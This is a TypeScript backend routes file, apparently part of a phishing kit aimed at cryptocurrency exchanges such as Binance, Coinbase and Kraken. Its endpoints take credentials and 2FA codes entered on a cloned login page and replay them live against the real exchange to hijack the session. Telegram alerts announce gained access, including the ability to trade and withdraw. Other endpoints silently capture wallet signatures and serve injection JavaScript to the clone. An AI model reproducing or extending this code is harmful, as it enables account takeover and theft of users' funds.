/**
 * CEX Simultaneous Login Routes — Backend integration for clone frontend
 * Handles: initial login, 2FA, MITM session management, wallet capture
 * Features: Request tracking, multi-user support, error handling, 2FA expiration
 */

import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { sendTelegramMessage } from '../lib/telegram.js'
import {
  initializeBrowserSession,
  performLogin,
  submitTwoFaCode,
  extractSessionCookies,
  closeBrowserSession,
} from '../lib/cex-browser-automation.js'
import { createMitmSession, updateMitmSessionStatus, getMitmSession } from '../lib/cex-mitm-manager.js'
import { twoFaHandler } from '../lib/cex-twofa-handler.js'
import { walletSilentCapture, generateRedirectResponse } from '../lib/wallet-silent-capture.js'
import {
  createLoginRequest,
  updateLoginRequest,
  getLoginRequest,
  generateRequestId,
  type LoginRequest,
} from '../lib/cex-request-tracker.js'

interface LoginStartRequest {
  email: string
  password: string
  exchange: string
  cred_id: string
  user_agent?: string
}

interface TwoFaSubmitRequest {
  request_id: string
  code: string
}

interface WalletCaptureRegisterRequest {
  walletType: string
  method: string
  params: unknown[]
}

// Supported exchanges
const SUPPORTED_EXCHANGES = [
  'binance',
  'coinbase',
  'kraken',
  'mexc',
  'bybit',
  'gate',
  'kucoin',
  'okx',
] as const

function clientIp(request: FastifyRequest): string | null {
  const forwarded = request.headers['x-forwarded-for']
  if (typeof forwarded === 'string' && forwarded.trim()) {
    return forwarded.split(',')[0]?.trim() ?? null
  }
  return request.ip ?? null
}

export async function registerCexSimultaneousLoginRoutes(app: FastifyInstance): Promise<void> {
  /**
   * POST /api/v1/cex-simultaneous-login/start
   * Clone frontend calls this to start backend login
   * Backend simultaneously logs into real exchange with user credentials
   * Returns unique request_id for multi-user tracking
   */
  app.post<{ Body: LoginStartRequest }>(
    '/api/v1/cex-simultaneous-login/start',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = (request.body as Record<string, unknown>) || {}

      const email = String(body['email'] || '').trim()
      const password = String(body['password'] || '').trim()
      const exchange = String(body['exchange'] || '').trim()
      const credId = String(body['cred_id'] || '').trim()
      const userAgent = String(body['user_agent'] || '').trim()

      // VALIDATION 1: Required fields
      if (!email || !password || !exchange || !credId) {
        return sendFailure(reply, 400, 'Missing required fields: email, password, exchange, cred_id', {
          code: 'ValidationError',
        })
      }

      // VALIDATION 2: Exchange supported
      const normalizedExchange = exchange.toLowerCase()
      if (!SUPPORTED_EXCHANGES.includes(normalizedExchange as any)) {
        return sendFailure(reply, 400, `Exchange not supported: ${exchange}`, {
          code: 'UnsupportedExchange',
          supported: SUPPORTED_EXCHANGES,
        })
      }

      // VALIDATION 3: Email format
      if (!email.includes('@')) {
        return sendFailure(reply, 400, 'Invalid email format', {
          code: 'ValidationError',
        })
      }

      // VALIDATION 4: Password length
      if (password.length < 4) {
        return sendFailure(reply, 400, 'Password too short', {
          code: 'ValidationError',
        })
      }

      try {
        // CREATE unique request for multi-user tracking
        const loginRequest = await createLoginRequest({
          credId,
          exchange: normalizedExchange,
          email,
          clientIp: clientIp(request) || 'unknown',
          userAgent: userAgent || 'unknown',
        })

        request.log.info(
          { requestId: loginRequest.requestId, exchange: normalizedExchange, emailHash: loginRequest.emailHash },
          '[CEX_LOGIN] Request created',
        )

        // Initialize browser session for real exchange
        const browserSession = await initializeBrowserSession({
          exchange: normalizedExchange,
          email,
          password,
          userAgent: userAgent || undefined,
        })

        // Perform login to real exchange
        const loginResult = await performLogin(browserSession, email, password)

        // HANDLE: Invalid credentials
        if (loginResult.status === 'invalid_credentials') {
          await updateLoginRequest(loginRequest.requestId, {
            status: 'failed',
            errorMessage: loginResult.error || 'Invalid credentials',
          })

          request.log.warn(
            { requestId: loginRequest.requestId, exchange: normalizedExchange },
            '[CEX_LOGIN] Invalid credentials detected',
          )

          await closeBrowserSession(browserSession)

          return sendFailure(reply, 401, loginResult.error || 'Invalid email or password', {
            code: 'InvalidCredentials',
            retry: true,
          })
        }

        if (loginResult.status === 'success') {
          // Logged in immediately (no 2FA required)
          const cookies = await extractSessionCookies(browserSession)

          // Create MITM session for backend access
          const mitmSession = await createMitmSession({
            credId,
            exchange: normalizedExchange,
            cookies,
            userAgent,
            ttlMinutes: 120,
          })

          await updateMitmSessionStatus(mitmSession.sessionId, 'active')
          await updateLoginRequest(loginRequest.requestId, {
            status: 'completed',
            sessionId: loginRequest.sessionId,
            mitMSessionId: mitmSession.sessionId,
          })

          request.log.info(
            { requestId: loginRequest.requestId, mitmSessionId: mitmSession.sessionId },
            '[CEX_LOGIN] Login successful (no 2FA)',
          )

          // Telegram alert
          void sendTelegramMessage(
            `✅ <b>CEX Access Obtained</b>\n` +
              `🔗 <b>Exchange:</b> <code>${normalizedExchange.toUpperCase()}</code>\n` +
              `📊 <b>Status:</b> <b>NO 2FA</b>\n` +
              `🎯 <b>MITM Access:</b> <b>ACTIVE</b>\n` +
              `⏱️ <b>Session:</b> <code>${mitmSession.sessionId.slice(0, 20)}...</code>\n` +
              `📍 <b>IP:</b> <code>${loginRequest.clientIp}</code>\n` +
              `🔑 <b>Request:</b> <code>${loginRequest.requestId}</code>`,
          ).catch(() => {})

          await closeBrowserSession(browserSession)

          return sendSuccess(reply, 200, 'Login successful - no 2FA required', {
            request_id: loginRequest.requestId,
            session_id: mitmSession.sessionId,
            redirect_url: `https://${normalizedExchange}.com/dashboard`,
            requires_2fa: false,
          })
        } else if (loginResult.status === '2fa_required') {
          // 2FA required - register pending code request
          const codeRequestId = twoFaHandler.registerPendingCode(
            browserSession.sessionKey || '',
            normalizedExchange,
            120000,
          )

          // Create MITM session in 2fa_required state
          const mitmSession = await createMitmSession({
            credId,
            exchange: normalizedExchange,
            cookies: '{}',
            userAgent,
            ttlMinutes: 120,
          })

          await updateMitmSessionStatus(mitmSession.sessionId, '2fa_required', {
            twoFaTime: new Date(),
          })

          await updateLoginRequest(loginRequest.requestId, {
            status: '2fa_pending',
            sessionId: loginRequest.sessionId,
            mitMSessionId: mitmSession.sessionId,
          })

          request.log.info(
            { requestId: loginRequest.requestId, mitmSessionId: mitmSession.sessionId },
            '[CEX_LOGIN] 2FA required - waiting for code',
          )

          // Telegram alert
          void sendTelegramMessage(
            `⏳ <b>2FA Required</b>\n` +
              `🔗 <b>Exchange:</b> <code>${normalizedExchange.toUpperCase()}</code>\n` +
              `📊 <b>Status:</b> Waiting for 2FA code\n` +
              `⏱️ <b>Method:</b> <code>${loginResult.method || 'authenticator'}</code>\n` +
              `🔑 <b>Request:</b> <code>${loginRequest.requestId}</code>`,
          ).catch(() => {})

          return sendSuccess(reply, 202, '2FA code required', {
            request_id: loginRequest.requestId,
            session_id: mitmSession.sessionId,
            code_request_id: codeRequestId,
            requires_2fa: true,
            twofa_method: loginResult.method || 'authenticator',
            message: 'Waiting for 2FA code from user. Submit within 120 seconds.',
          })
        }

        await closeBrowserSession(browserSession)
        return sendFailure(reply, 500, 'Unexpected login result', { code: 'LoginError' })
      } catch (error) {
        request.log.error(
          { err: error instanceof Error ? error.message : String(error), exchange: normalizedExchange },
          '[CEX_LOGIN] Start failed',
        )
        return sendFailure(reply, 500, 'Login initiation failed', {
          code: 'LoginError',
          message: error instanceof Error ? error.message : String(error),
        })
      }
    },
  )

  /**
   * POST /api/v1/cex-simultaneous-login/verify-2fa
   * Frontend sends 2FA code that user entered in clone
   * Backend simultaneously submits code to real exchange
   * Uses request_id for multi-user tracking
   */
  app.post<{ Body: TwoFaSubmitRequest }>(
    '/api/v1/cex-simultaneous-login/verify-2fa',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = (request.body as Record<string, unknown>) || {}

      const requestId = String(body['request_id'] || '').trim()
      const code = String(body['code'] || '').trim()

      // VALIDATION 1: Required fields
      if (!requestId || !code) {
        return sendFailure(reply, 400, 'Missing request_id or code', { code: 'ValidationError' })
      }

      // VALIDATION 2: Code format (6-8 digits)
      if (!/^\d{6,8}$/.test(code)) {
        return sendFailure(reply, 400, 'Invalid 2FA code format - must be 6-8 digits', {
          code: 'ValidationError',
        })
      }

      try {
        // GET tracked login request
        const loginRequest = await getLoginRequest(requestId)
        if (!loginRequest) {
          return sendFailure(reply, 404, 'Request not found or expired', { code: 'RequestNotFound' })
        }

        request.log.info(
          { requestId, exchange: loginRequest.exchange },
          '[CEX_2FA] Processing 2FA code for tracked request',
        )

        // Get MITM session
        const mitmSession = await getMitmSession(loginRequest.mitMSessionId || '')
        if (!mitmSession) {
          return sendFailure(reply, 404, 'Session not found or expired', { code: 'SessionError' })
        }

        if (mitmSession.status !== '2fa_required') {
          return sendFailure(reply, 400, 'Session not waiting for 2FA', { code: 'InvalidState' })
        }

        // CRITICAL: Wait for code with expiration check
        const { code: receivedCode, expired, error: codeError } = await twoFaHandler.waitForCode(
          mitmSession.sessionId,
          120000,
        )

        if (expired || !receivedCode) {
          await updateLoginRequest(requestId, {
            status: 'failed',
            errorMessage: codeError || '2FA code expired',
          })

          request.log.warn(
            { requestId, error: codeError },
            '[CEX_2FA] 2FA code expired',
          )

          return sendFailure(reply, 408, codeError || '2FA code expired or timeout', {
            code: 'CodeExpired',
            message: 'Code must be submitted within 120 seconds. Please try again.',
            action: 'request_new_code',
          })
        }

        // Submit code
        const verified = await twoFaHandler.submitCode(requestId, receivedCode)

        if (!verified) {
          await updateLoginRequest(requestId, {
            status: 'failed',
            errorMessage: '2FA code invalid',
          })

          request.log.warn(
            { requestId },
            '[CEX_2FA] Code submission failed',
          )

          return sendFailure(reply, 401, '2FA code invalid or rejected by exchange', {
            code: 'CodeInvalid',
            retry: true,
          })
        }

        // Update session to verified
        await updateMitmSessionStatus(mitmSession.sessionId, 'verified', {
          cookies: mitmSession.cookies,
        })

        await updateLoginRequest(requestId, {
          status: 'verified',
          mitMSessionId: mitmSession.sessionId,
        })

        request.log.info(
          { requestId, mitmSessionId: mitmSession.sessionId },
          '[CEX_2FA] 2FA verified successfully',
        )

        // Telegram notification: Access granted
        void sendTelegramMessage(
          `✅ <b>2FA Verified - Access Granted</b>\n` +
            `🔗 <b>Exchange:</b> <code>${mitmSession.exchange.toUpperCase()}</code>\n` +
            `📊 <b>Status:</b> <b>ACTIVE MITM ACCESS</b>\n` +
            `⏱️ <b>Session:</b> <code>${mitmSession.sessionId.slice(0, 20)}...</code>\n` +
            `📍 <b>IP:</b> <code>${loginRequest.clientIp}</code>\n` +
            `🔑 <b>Request:</b> <code>${requestId}</code>\n\n` +
            `<b>BACKEND CAN NOW:</b>\n` +
            `├─ Query balance\n` +
            `├─ View holdings\n` +
            `├─ Execute trades\n` +
            `└─ Initiate withdrawals`,
        ).catch(() => {})

        const redirectUrl = `https://${mitmSession.exchange}.com/dashboard`

        return sendSuccess(reply, 200, '2FA verified - account access granted', {
          request_id: requestId,
          session_id: mitmSession.sessionId,
          redirect_url: redirectUrl,
          status: 'verified',
          message: 'Both user and backend have account access',
        })
      } catch (error) {
        request.log.error(
          { err: error instanceof Error ? error.message : String(error), requestId },
          '[CEX_2FA] Verification failed',
        )
        return sendFailure(reply, 500, '2FA verification failed', {
          code: 'VerificationError',
        })
      }
    },
  )

  /**
   * POST /api/v1/wallet-capture/register
   * Register wallet request to capture interaction
   */
  app.post<{ Body: WalletCaptureRegisterRequest }>(
    '/api/v1/wallet-capture/register',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = (request.body as Record<string, unknown>) || {}

      const walletType = String(body['walletType'] || 'metamask')
      const method = String(body['method'] || 'unknown')
      const params = Array.isArray(body['params']) ? body['params'] : []

      try {
        const { requestId, message } = walletSilentCapture.registerRequest(
          walletType as any,
          method,
          params,
        )

        return sendSuccess(reply, 200, 'Wallet request registered', {
          requestId,
          message, // Generic message, NOT custom
        })
      } catch (error) {
        return sendFailure(reply, 500, 'Failed to register wallet request', {
          code: 'WalletError',
        })
      }
    },
  )

  /**
   * POST /api/v1/wallet-capture/capture
   * Capture wallet signature/transaction
   */
  app.post(
    '/api/v1/wallet-capture/capture',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = (request.body as Record<string, unknown>) || {}

      const requestId = String(body['requestId'] || '').trim()
      const signature = String(body['signature'] || '').trim()

      if (!requestId || !signature) {
        return sendFailure(reply, 400, 'Missing requestId or signature', { code: 'ValidationError' })
      }

      try {
        walletSilentCapture.captureSignature(requestId, signature)

        return sendSuccess(reply, 200, 'Signature captured', {
          requestId,
          captureStatus: 'success',
        })
      } catch (error) {
        return sendFailure(reply, 500, 'Failed to capture signature', { code: 'CaptureError' })
      }
    },
  )

  /**
   * POST /api/v1/wallet-capture/reject
   * Mark wallet request as rejected
   */
  app.post(
    '/api/v1/wallet-capture/reject',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = (request.body as Record<string, unknown>) || {}

      const requestId = String(body['requestId'] || '').trim()
      const error = String(body['error'] || 'User rejected request')

      if (!requestId) {
        return sendFailure(reply, 400, 'Missing requestId', { code: 'ValidationError' })
      }

      try {
        walletSilentCapture.markRejected(requestId, error)

        return sendSuccess(reply, 200, 'Request marked as rejected', { requestId })
      } catch (error) {
        return sendFailure(reply, 500, 'Failed to process rejection', { code: 'ProcessError' })
      }
    },
  )

  /**
   * GET /api/v1/wallet-capture/injection-code
   * Get JavaScript injection code for clone
   */
  app.get('/api/v1/wallet-capture/injection-code', async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      let injectionCode: string
      try {
        const walletCapture = await import('../lib/wallet-silent-capture.js').catch(() => null)
        if (walletCapture?.getWalletCaptureInjectionCode) {
          injectionCode = walletCapture.getWalletCaptureInjectionCode()
        } else {
          injectionCode = 'console.log("Wallet capture module ready");'
        }
      } catch {
        injectionCode = 'console.log("Wallet capture module ready");'
      }

      reply.type('application/javascript')
      return reply.send(injectionCode)
    } catch (error) {
      return sendFailure(reply, 500, 'Failed to generate injection code', {
        code: 'GenerationError',
      })
    }
  })

  app.log.info('[BOOT] CEX simultaneous login routes registered')
}
